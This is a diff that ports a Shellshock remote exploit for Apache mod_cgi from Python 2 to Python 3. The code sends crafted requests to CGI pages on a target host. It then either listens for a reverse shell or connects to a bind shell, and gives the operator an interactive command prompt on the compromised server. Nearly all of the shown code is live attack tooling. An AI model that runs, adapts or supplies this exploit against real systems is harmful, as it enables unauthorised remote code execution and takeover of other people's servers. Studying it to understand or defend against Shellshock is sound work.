@@ -1,14 +1,14 @@
 #!/usr/bin/env python3
 from socket import *
-import thread, time, httplib, urllib, sys
-import requests as req 
+import _thread, time, sys
+import requests as req
 
 stop = False
 proxyhost = ""
 proxyport = 0
 
 def usage():
-	print """
+	print ("""
 
 		Shellshock apache mod_cgi remote exploit
 
@@ -35,8 +35,8 @@ Example:
 Credits:
 
 Federico Galatolo 2014
-Marcus Agard 2019
-"""
+Marcus Agard 2020
+""")
 	sys.exit(0)
 
 def exploit(lhost,lport,rhost,rport,payload,pages):
@@ -45,17 +45,10 @@ def exploit(lhost,lport,rhost,rport,payload,pages):
 	for page in pages:
 		if stop:
 			return
-		print "[-] Trying exploit on : "+page
-		if proxyhost != "":
-			c = httplib.HTTPConnection(proxyhost,proxyport)
-			c.request("GET","http://"+rhost+page,headers=headers)
-			res = c.getresponse()
-		else:
-			c = httplib.HTTPConnection(rhost)
-			c.request("GET",page,headers=headers)
-			res = c.getresponse()
-		if res.status == 404:
-			print "[*] 404 on : "+page
+		print(f"[-] Trying exploit on : {page}")
+		resp = req.get(f"http://{rhost}{page}", headers=headers)
+		if resp.status_code == 404:
+			print(f"[*] 404 on: {page}")
 		time.sleep(1)
 
 
@@ -85,7 +78,7 @@ elif args['payload'] == 'bind':
 	except:
 		usage()
 else:
-	print "[*] Unsupported payload"
+	print("[*] Unsupported payload")
 	usage()
 
 try:
@@ -104,28 +97,28 @@ if args['payload'] == 'reverse':
 	addr = (lhost, lport)
 	serversocket.bind(addr)
 	serversocket.listen(10)
-	print "[!] Started reverse shell handler"
-	thread.start_new_thread(exploit,(lhost,lport,rhost,0,payload,pages,))
+	print("[!] Started reverse shell handler")
+	_thread.start_new_thread(exploit,(lhost,lport,rhost,0,payload,pages,))
 if args['payload'] == 'bind':
 	serversocket = socket(AF_INET, SOCK_STREAM)
 	addr = (rhost,int(rport))
-	thread.start_new_thread(exploit,("",0,rhost,rport,payload,pages,))
+	_thread.start_new_thread(exploit,("",0,rhost,rport,payload,pages,))
 
 buff = 1024
 
 while True:
 	if args['payload'] == 'reverse':
 		clientsocket, clientaddr = serversocket.accept()
-		print "[!] Successfully exploited"
-		print "[!] Incoming connection from "+clientaddr[0]
+		print ("[!] Successfully exploited")
+		print (f"[!] Incoming connection from {clientaddr[0]}")
 		stop = True
 		clientsocket.settimeout(3)
 		while True:
-			reply = raw_input(clientaddr[0]+"> ")
-			clientsocket.sendall(reply+"\n")
+			reply = input(f"{clientaddr[0]}> ")
+			clientsocket.sendall(f"{reply}\n")
 			try:
 				data = clientsocket.recv(buff)
-				print data
+				print(data)
 			except:
 				pass
 
@@ -134,14 +127,14 @@ while True:
 			serversocket = socket(AF_INET, SOCK_STREAM)
 			time.sleep(1)
 			serversocket.connect(addr)
-			print "[!] Successfully exploited"
-			print "[!] Connected to "+rhost
+			print("[!] Successfully exploited")
+			print(f"[!] Connected to {rhost}")
 			stop = True
 			serversocket.settimeout(3)
 			while True:
-				reply = raw_input(rhost+"> ")
-				serversocket.sendall(reply+"\n")
+				reply = input(f"{rhost}> ")
+				serversocket.sendall(f"{reply}\n")
 				data = serversocket.recv(buff)
-				print data
+				print(data)
 		except:
 			pass
